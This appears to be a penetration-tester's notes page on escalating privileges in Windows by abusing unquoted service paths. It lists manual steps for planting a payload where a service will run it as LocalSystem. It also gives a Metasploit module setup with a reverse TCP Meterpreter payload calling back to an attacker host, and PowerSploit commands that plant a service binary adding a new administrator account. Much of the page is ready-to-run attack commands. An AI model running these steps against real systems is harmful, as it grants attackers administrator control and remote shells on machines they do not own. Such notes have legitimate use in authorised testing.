# Manually
1) [Look for Unquoted Service Paths](../../Tools/Shells/Windows/CMD/README.md#Look-for-Unquoted-Service-Paths).
2) Test for permission to [Stop](../../Tools/Shells/Windows/CMD/README.md#Stop-Service) and [Start](../../Tools/Shells/Windows/CMD/README.md#Start-Service) Service.
3) [Confirm that service will start as the LocalSystem Account](../../Tools/Shells/Windows/CMD/README.md#Query-Service).
4) [Confirm permission to write to directory in service path](../../Tools/Shells/Windows/CMD/README.md#Check-Access-Control-on-File-or-Directory).
5) Generate payload, named to match the segment of the service path.
6) Upload payload to service path, on target, with [Meterpreter](../../Tools/Metasploit/README.md#Upload-File).
7) The process can be unstable.  [Start Meterpreter listener, with autorun script to migrate to an existing SvcHost.exe process](../../Tools/Metasploit/README.md#Start-Handler-with-AutoRunScript-to-Migrate-Process).
8) [Stop](../../Tools/Shells/Windows/CMD/README.md#Stop-Service) and [Start](../../Tools/Shells/Windows/CMD/README.md#Start-Service) the service on the target.

# Metasploit
```bash
use exploit/windows/local/unquoted_service_path
set SESSION [Session ID]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [Attack Host]
set LPORT [Port #]
exploit
```
 
# PowerSploit
##### Create New User in Administrators Group
```powershell
PS > Get-ServiceUnquoted
PS > Write-ServiceBinary -Name "[Binary Name]" -Path "[Binary Path]"

# Adds new user john to Administrators group, when the service is restared.
```
##### Confirm User Created
```cmd
net localgroup Administrators
```

# References
##### [Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)